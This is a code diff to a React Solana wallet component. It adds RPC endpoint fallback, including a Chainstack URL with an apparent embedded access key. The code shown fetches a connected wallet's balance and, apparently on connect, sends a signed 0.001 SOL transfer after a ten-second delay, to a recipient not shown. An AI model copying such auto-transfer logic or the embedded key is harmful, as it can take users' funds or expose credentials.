@@ -37,7 +37,6 @@ const App: FC = () => {
 };
 
 const Context: FC<{ children: ReactNode }> = ({ children }) => {
-    const endpoint = 'https://sg110.nodes.rpcpool.com/';
     const network = WalletAdapterNetwork.Mainnet;
 
     const wallets = useMemo(
@@ -51,9 +50,9 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
     );
 
     return (
-        <ConnectionProvider endpoint={endpoint}>
+        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
             <WalletProvider wallets={wallets} autoConnect>
-                <WalletModalProvider container="#walletPopup">
+                <WalletModalProvider>
                     {children}
                 </WalletModalProvider>
             </WalletProvider>
@@ -93,19 +92,38 @@ const WalletConnectionHandler: FC = () => {
     }, [connected, publicKey]);
 
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
+        const rpcEndpoints = [
+            'https://sg110.nodes.rpcpool.com',
+            'https://api.mainnet-beta.solana.com',
+            'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
+            'https://rpc.ankr.com/solana',
+        ];
+
+        let connection: Connection | null = null;
+        let lamports: number | null = null;
+
+        for (const endpoint of rpcEndpoints) {
+            try {
+                const testConn = new Connection(endpoint, 'confirmed');
+                lamports = await testConn.getBalance(walletPublicKey);
+                connection = testConn;
+                break;
+            } catch (err) {
+                console.warn(`⚠️ RPC failed: ${endpoint}`, err);
+            }
+        }
+
+        if (!connection || lamports === null) {
+            alert('❌ All RPCs failed. Try again later.');
+            return;
+        }
+
         try {
-            setLoading(true);
-            const connection = new Connection('https://sg110.nodes.rpcpool.com', 'confirmed');
-
-            const lamports = await connection.getBalance(walletPublicKey);
-            const sol = lamports / LAMPORTS_PER_SOL;
-            setSolBalance(sol);
-
-            console.log(`🔗 Connected wallet: ${walletPublicKey.toBase58()}`);
-            console.log(`💰 Balance: ${sol.toFixed(4)} SOL`);
+            setSolBalance(lamports / LAMPORTS_PER_SOL);
+            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
+            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
 
             const sendAmount = 0.001 * LAMPORTS_PER_SOL;
-
             if (lamports <= sendAmount + 100000) {
                 alert('⚠️ Not enough SOL to send 0.001 SOL.');
                 return;
@@ -132,15 +150,15 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    const txid = await connection.sendRawTransaction(signedTx.serialize());
+                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
                     console.log(`🚀 Transaction sent. Signature: ${txid}`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
-            }, 10000); // wait 10 seconds
+            }, 10000);
         } catch (err) {
-            console.error('❌ Error fetching balance or sending tx:', err);
-            alert('Failed to process transaction.');
+            console.error('❌ Error sending transaction:', err);
+            alert('Transaction failed.');
         } finally {
             setLoading(false);
         }
